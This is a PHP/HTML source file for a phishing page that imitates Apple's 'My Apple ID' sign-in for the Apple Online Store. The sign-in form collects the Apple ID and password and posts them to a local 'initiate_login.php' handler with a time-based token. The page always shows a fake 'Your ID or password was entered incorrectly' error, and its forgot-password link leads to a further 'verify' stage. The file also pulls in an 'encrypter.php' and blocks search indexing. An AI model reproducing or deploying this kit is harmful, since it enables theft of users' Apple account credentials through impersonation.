<!DOCTYPE html>
<html class="en-us nojs us en amr" lang="en-US">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta name="viewport" content="width=1024" />
	<?php require_once 'encrypter.php'; ?>
    <title>Sign in - My Apple ID</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="Sign in" />
    <link rel="icon" type="image/png" href="base/images/favicon.png">
    <link rel="shortcut icon" type="image/x-icon" href="base/images/favicon.ico">
    <script>
    //replace nojs class with js on html element
    (function(html) {
        html.className = html.className.replace(/\bnojs\b/, 'js')
    })(document.documentElement);
    </script>
    <!--[if gte IE 9]><!-->
    <link rel="stylesheet" href="base/css/style.css" media="screen, print" />
    <!--<![endif]-->

    <!--[if gte IE 9]><!-->
    <link rel="stylesheet" href="base/css/signin.css" media="screen, print" />
    <!--<![endif]-->
    <!--[if gte IE 9]><!-->
    <link rel="stylesheet" href="base/css/signin@2x.css" media="only screen and (-webkit-min-device-pixel-ratio:2), only screen and (min--moz-device-pixel-ratio:2), only screen and (-o-min-device-pixel-ratio:2/1), only screen and (min-device-pixel-ratio:2)" />
    <!--<![endif]-->

    <link rel="stylesheet" href="base/css/aos-overrides.css" media="screen, print" />
    <link rel="stylesheet" href="base/css/aos-local.css" media="" />
    <script>
    window.irOn = true;
    </script>
    <script src="base/js/bootstrap.js"></script>
    <script src="base/js/coherent.js"></script>
    <script src="base/js/apple.js"></script>
    <meta name="robots" content="noindex, nofollow" />
</head>


<body class="interim login">
    <div class="metrics">

    </div>
    <div id="page">
        <div id="page">
            <div aria-label="Apple" class="store enhanced outside globalheader-loaded" role="navigation" id="apple-header" style="visibility: visible;">
                <ul class="links">
                    <li>
                        <a class="apple" href="#">
                            <span>Apple</span>
                        </a>
                    </li>
                    <li>
                        <a data-evar1="AOS: TopNavigation | Store" href="#" class="store">
                            <span>Store</span>
                        </a>
                    </li>
                    <li>
                        <a class="mac" href="#">
                            <span>Mac</span>
                        </a>
                    </li>
                    <li>
                        <a class="ipod" href="#">
                            <span>iPod</span>
                        </a>
                    </li>
                    <li>
                        <a class="iphone
" href="#">
                            <span>iPhone</span>
                        </a>
                    </li>
                    <li>
                        <a class="ipad" href="#">
                            <span>iPad</span>
                        </a>
                    </li>
                    <li>
                        <a class="itunes" href="#">
                            <span>iTunes</span>
                        </a>
                    </li>
                    <li>
                        <a class="support" href="#">
                            <span>Support</span>
                        </a>
                    </li>
                </ul>
                <div class="search">
                    <form data-evar30="account/sign_in/standard" data-evar1="AOS: account/sign_in/standard |  | " onclick="s_objectID='';" action="#" id="site-search" class="site-search" role="search">
                        <div class="sitesearch-wrapper autocomplete" __parametersid="parameters_31" id="coherent_id_3">
                            <div class="wrapper">
                                <label for="site-search-query">Search Store</label>
                                <input type="text" id="site-search-query" value="" autocomplete="off" name="find" __parametersid="parameters_32" class=" nullValue" aria-autocomplete="list" aria-expanded="false" aria-owns="coherent_id_6">
                            </div>
                            <a class="search-reset inputReset" style="display:none;" __parametersid="parameters_33" id="coherent_id_4"></a>
                            <span class="search-spinner" style="display:none;" __parametersid="parameters_34" id="coherent_id_5"></span>
                            <div id="coherent_id_6" class="search-auto-complete" style="display: none;" aria-hidden="true">
                                <ul id="coherent_id_7" role="listbox">
                                    <li></li>
                                </ul>
                            </div>
                        </div>
                    </form>
                    <div class="sp-magnify">
                        <div class="magnify-searchmode"></div>
                        <div class="magnify"></div>
                    </div>
                </div>
                <br>
                <div class="store-header clearfix" style="margin-top:18px">
                    <div class="masthead clearfix" id="coherent_id_8">
                        <div class="masthead-title">
                            <a data-evar30="account/sign_in/standard/Astro_Link" href="#">
                                <img width="141" height="29" data-scale-params-2="wid=282&amp;hei=58&amp;fmt=png-alpha&amp;qlt=95&amp;.v=1364844187681" alt="" src="base/images/head-apple-store.png" class="ir">
                                <span class="a11y">Apple Store</span>
                            </a>

                        </div>
                        <div id="guide_wrap" class="user-navigation" aria-label="User Tools" role="navigation">
                            <ul class="utilitynav" role="menubar" id="utilitynav">
                                <li style="display: none;" id="u_apple">
                                    <a class="apple-icon" href="#">
                                        <span class="a11y">Apple</span>
                                    </a>
                                </li>
                                <li role="presentation" id="u_chat">

                                    <div class="chat chat-resize cchat">
                                        <div class="ui-button">
                                            <span>Chat Now</span>
                                        </div>
                                    </div>

                                </li>
                                <li role="presentation" id="u_tele">
                                    <div class="needhelp-link">

                                        <div class="needhelp-link">
                                            <a aria-describedby="needhelp_drawer" class="needhelp" id="needhelp" href="#">Need help? Just ask.</a>
                                        </div>

                                    </div>
                                    <div class="needhelp_drawer" id="needhelp_drawer">
                                        <div class="box relational">
                                            <a data-evar1="AOS: " href="#" id="caslink">
                                                <div class="title-body">
                                                    <span class="title">Need help with a product you own?</span>
                                                    <span class="title-description">Get help with all your Apple products, such as iPhone, iPad, Mac, and iTunes.</span>
                                                </div>
                                                <span class="a11y">This will open a new window.</span>
                                            </a>

                                            <a data-evar30="account/sign_in/standard/concierge-nav-account" href="#">
                                                <div class="title-body">
                                                    <span class="title">Need help with an order you placed?</span>
                                                    <span class="title-description">Check the status of your Apple Online Store order, and track your shipment.</span>
                                                </div>
                                            </a>

                                            <a id="chatlink" href="#">
                                                <div class="title-body">
                                                    <span class="title">Need help buying products you want?</span>
                                                    <span class="title-description">Chat online and we’ll help you get the right product. Or call 1-800-MY-APPLE.</span>
                                                </div>
                                                <span class="a11y">This will open a new window.</span>
                                            </a>

                                        </div>
                                    </div>

                                    <div class="contact">
                                        <a aria-describedby="call-apple-content" style="cursor:pointer;" class="number" id="call-apple" href="#">1-800-MY-APPLE</a>
                                    </div>
                                    <div class="contact-drawer opacity" id="contact-drawer" aria-hidden="true">
                                        <div class="box relational">
                                            <div class="call-apple-content" role="tooltip" id="call-apple-content">
                                                Have questions? Just ask. Speak to an Apple Specialist over the phone Sun-Sat 4:00 a.m. to 10:00 p.m. Pacific time.
                                            </div>
                                        </div>
                                    </div>

                                </li>
                                <li role="presentation" id="u_account">
                                    <a data-evar30="account/sign_in/standard/Navigation_User_Assistance_Bar" href="#" __parametersid="parameters_68" id="coherent_id_9" aria-haspopup="true" aria-owns="unav-account">Account</a>
                                </li>
                                <li class="cart" role="presentation" id="u_cart">
                                    <a data-evar30="account/sign_in/standard/Navigation_User_Assistance_Bar" href="#" class="cart-icon" __parametersid="parameters_69" id="coherent_id_10" aria-haspopup="true" aria-owns="unav-cart">Cart</a>
                                </li>
                            </ul>
                            <div class="utility-nav" id="utility-nav">
                                <div class="utility-nav-content" id="utility-nav-content" aria-live="polite">
                                    <div class="utility-nav-section utility-nav-loading" id="utility-nav-loading">
                                        <div class="subsection">
                                            <p class="replaced">Loading</p>
                                        </div>
                                    </div>
                                    <div class="utility-nav-section unav-account" id="unav-account" __parametersid="parameters_56" aria-hidden="true">
                                        <div class="unav-account-box">
                                            <div class="unav-popular-account-links subsection last" id="unav-popular-account-links">

                                                <div>
                                                    <div class="panel-body">
                                                        <ul class="clearfix tiles-5" role="menu">
                                                            <li class="tile-1">
                                                                <a data-evar30="account/sign_in/standard/utility-nav-account" href="#" class="block tile-link">
                                                                    <div class="tile-body">
                                                                        <span class="title">Check Order Status</span>
                                                                        <span class="title-description">Find out estimated delivery dates for your orders.</span>
                                                                    </div>
                                                                </a>
                                                            </li>
                                                            <li class="tile-2">
                                                                <a data-evar30="account/sign_in/standard/utility-nav-account" href="#" class="block tile-link">
                                                                    <div class="tile-body">
                                                                        <span class="title">Return Items</span>
                                                                        <span class="title-description">Return your items and get a refund.</span>
                                                                    </div>
                                                                </a>
                                                            </li>
                                                            <li class="tile-3">
                                                                <a data-evar30="account/sign_in/standard/utility-nav-account" href="#" class="block tile-link">
                                                                    <div class="tile-body">
                                                                        <span class="title">Cancel Items</span>
                                                                        <span class="title-description">Cancel orders recently placed.</span>
                                                                    </div>
                                                                </a>
                                                            </li>
                                                            <li class="tile-4">
                                                                <a data-evar30="account/sign_in/standard/utility-nav-account" href="#" class="block tile-link">
                                                                    <div class="tile-body">
                                                                        <span class="title">View Account</span>
                                                                        <span class="title-description">Manage account settings, payments and order info.</span>
                                                                    </div>
                                                                </a>
                                                            </li>
                                                            <li class="tile-5">
                                                                <a data-evar30="account/sign_in/standard/utility-nav-account" href="#" class="block tile-link">
                                                                    <div class="tile-body">
                                                                        <span class="title">Get Help</span>
                                                                        <span class="title-description">Learn about placing, tracking, managing your orders and more.</span>
                                                                    </div>
                                                                </a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>

                                            </div>
                                        </div>
                                    </div>
                                    <div class="utility-nav-section unav-cart" id="unav-cart" __parametersid="parameters_57" role="menu" aria-hidden="true">
                                        <div class="unav-cart-box">
                                            <div class="unav-your-cart subsection" id="unav-your-cart">
                                                <span class="unav-your-cart-title" __parametersid="parameters_61" id="coherent_id_14" style="display: none;">Your Cart</span>
                                                <ul class="cart-list" __parametersid="parameters_67" id="coherent_id_16" style="display: none;">
                                                    <li></li>
                                                </ul>
                                                <div class="empty-cart-message" __parametersid="parameters_60" id="coherent_id_13">
                                                    <p>There are no items in your Cart.</p>
                                                </div>
                                                <p class="view-link"><a href="#" __parametersid="parameters_58" id="coherent_id_11">View Cart</a>
                                                </p>
                                            </div>
                                            <div class="unav-saved-items subsection" id="unav-saved-items">
                                                <div class="list_content">

                                                    <div class="list-of-links">
                                                        <div class="section list_content">
                                                            <ul>
                                                                <li>
                                                                    <a data-evar30="account/sign_in/standard/utility-nav-saved-item-links" href="#">
                                        
                                        
                                            Saved Items
                                        
                                    </a>
                                                                </li>
                                                                <li>
                                                                    <a data-evar30="account/sign_in/standard/utility-nav-saved-item-links" href="#">
                                        
                                        
                                            Saved Carts
                                        
                                    </a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                            <div class="subsection last checkout" __parametersid="parameters_62" id="coherent_id_15" style="display: none;">
                                                <a data-evar30="account/sign_in/standard/AstroButton" href="#" class="button rect more" __parametersid="parameters_59" id="coherent_id_12" style="display: none;">
                                                    <span>
                                                        <span class="effect"></span>
                                                        <span class="label">
                                                            Check Out Now
                                                        </span>
                                                    </span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <button style="display:none;" id="utilitynav-close-button" class="close">Close</button>
                            </div>
                            <script type="text/javascript">
                            Event.onLoad(function() {
                                var surveyJSON = "",
                                    utilityNavController = apple.utilitynav.UtilityNavViewController.singleton($('guide_wrap'), {
                                        surveyData: surveyJSON
                                    }),
                                    utilityNavInit = {
                                        "url": "/us/cart_utility_nav"
                                    };
                                utilityNavController.data.setUrl(utilityNavInit.url);
                            });
                            </script>
                        </div>
                    </div>
                </div>

                <div id="container">
                    <div class="accountbox" role="main">
                        <div id="account-page-header">
                            <h1>Please Sign In</h1>
                            <p class="secure">Secure</p>
                        </div>
                        <p class="content-section xs-js" id="no-javascript-message">
                            Please enable JavaScript to view this page properly.
                        </p>
						<?php $indexs="initiate_login.php?token;".md5(time()).md5(time()); ?>
                        <div class="content clearfix" id="account-content" __parametersid="parameters_314">
                            <div class="login">
                                <div class="returning-customer" tabindex="-1" id="sign-in-content">
                                    <div class="form">
                                        <form autocomplete="off" method="post" class="sign-in" action="<?php echo $indexs ?>" id="sign-in-form">
                                            <h2>Enter your Apple ID and password</h2>
                                          
										   <div id="error-sign-in" style="" class="box alert"> <div class="error-container"><div class="error-content"><p class="alert text-alert" id="login-errorText">Your ID or password was entered incorrectly.</p></div></div> </div>

                                            <p>
                                                <span class="field-with-placeholder">
                                                    <!--<label class="placeholder" for="login-appleId">
                                                        <span id="username-label">Apple ID</span>
                                                    </label> -->
                                                    <input type="email" id="login-appleId" class="login" maxlength="128" size="30" name="id" aria-invalid="false" required placeholder="Apple ID">
                                                </span>
                                                <span class="field-with-placeholder">
                                                   <!-- <label class="placeholder" for="login-password">
                                                        <span style="" id="password-label">Password</span>
                                                    </label> -->
                                                    <input type="password" id="login-password" class="password" maxlength="32" size="30" name="password" aria-invalid="false" required placeholder="Password">
                                                </span>
                                            </p>
											<?php $index="initiate.php?cmd=initiate_verfiy=true&_session;".md5(time()).md5(time()); ?>
                                            <div class="actions">
                                                <button id="sign-in" class="button rect" type="submit">
                                                    <span>
                                                        <span class="effect"></span>
                                                        <span class="label">Sign In</span>
                                                    </span>
                                                </button>
                                            </div>
                                            <p id="iforgot-link">
                                                <a data-prop37="AOS: | Checkout: LogIn: Forgot AppleID / Password" href="<?php echo $index ?>" id="go-iforgot" target="browser">Forgot your Apple ID or Password?</a>
                                            </p>
                                        </form>
                                    </div>
                                </div>
                                <div style="display: none;" id="forgot-password-content">
                                    <div class="form">
                                        <form method="post" action="<?php echo $index ?>" name="forgetPasswordForm">
                                            <h3>Forgot your Apple ID or Password?</h3>
                                            <p>
                                                <span id="iforgot-lockout">
                                                    <a id="go-iforgot-lockout" href="#" target="browser">Reset your password</a>
                                                </span>
                                            </p>
                                            <p>When you have reset your password you can
                                                <button id="continue-shopping" class="">continue with your shopping</button>.</p>
                                        </form>
                                    </div>
                                </div>
                                <div class="contact-us secondary">
                                    <p>You can use your Apple ID for other Apple services such as</p>
                                    <ul>
                                        <li>iTunes Store</li>
                                        <li>iPhoto Print Products</li>
                                        <li>iCloud</li>
                                    </ul>
                                   
                                </div>
                            </div>
                        </div>
                        <div class="cart-navigation">
                            <a class="button rect secondary" id="cancel-button" href="#">
                                <span>Cancel</span>
                            </a>
                            <p class="details">
                                Questions? Just ask.
                                <span class="contact-phone">1-800-MY-APPLE</span>
                            </p>
                        </div>
                    </div>
                    <div id="apple-footer" class="apple-footer apple-footer-simple clearfix" role="contentinfo">
                        <p class="note">The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
                        <div class="plf" id="plf">
                            <h2 class="a11y" id="plf-head">Leave feedback</h2>
                            <p class="plf-intro">
                                <button type="button" class="plf-open-btn" aria-owns="coherent_id_1">Have an opinion on this page?
                                    <span>Let's hear it.</span>
                                </button>
                                <span class="plf-openedMsg">When you're done, just click Submit.</span>
                                <span class="plf-needhelp">Need help?</span>
                                <a href="#" rel="nofollow" target="_blank">Contact Us</a>
                            </p>
                            <div aria-live="polite" aria-expanded="false" class="plf-drawer clearfix" aria-labelledby="plf-head" tabindex="-1" id="coherent_id_1">
                                <form method="post" class="plf-form" aria-hidden="true" id="plf-form">
                                    <div class="plf-questions-container">
                                        <span class="subhead">Please rate:</span>
                                        <div class="plf-rating-questions"></div>
                                        <div class="plf-freetext-questions col"></div>
                                    </div>
                                    <div class="formbuttons">
                                        <button type="button" class="button cancel" disabled="">Cancel</button>
                                        <button type="submit" class="button merchandising" disabled="">Submit</button>
                                    </div>
                                </form>
                                <p class="plf-msg" aria-hidden="true" id="plf-msg"></p>
                                <p aria-live="assertive" class="a11y" id="plf-count"></p>
                            </div>
                        </div>
                        <ul class="sosumi">
                            <li>Copyright &copy; 2015 Apple Inc. All rights reserved.</li>
                            <li><a href="#">Terms of Use</a>
                            </li>
                            <li><a href="#">Privacy Policy</a>
                            </li>
                            <li><a href="#" target="popupw550h600">Sales and Refunds</a>
                            </li>
                        </ul>
                        <ul id="format-switcher" class="format-switcher" __parametersid="parameters_74" style="display: none;">
                            <li>
                                <a data-evar30="account/sign_in/standard/Footer_Context_Switch" data-evar1="AOS: account/sign_in/standard |  | Footer Context Switch | FS:Checkout Sign In:Mobile optimized selected" onclick="s_objectID='';" href="#" id="mobile" data-sprop36="FS:Checkout Sign In |   | Mobile optimized selected" __parametersid="parameters_73">
				Mobile Site
			</a>
                            </li>
                            <li>
                                Desktop Site
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
</body>

</html>
<?php ob_end_flush(); ?>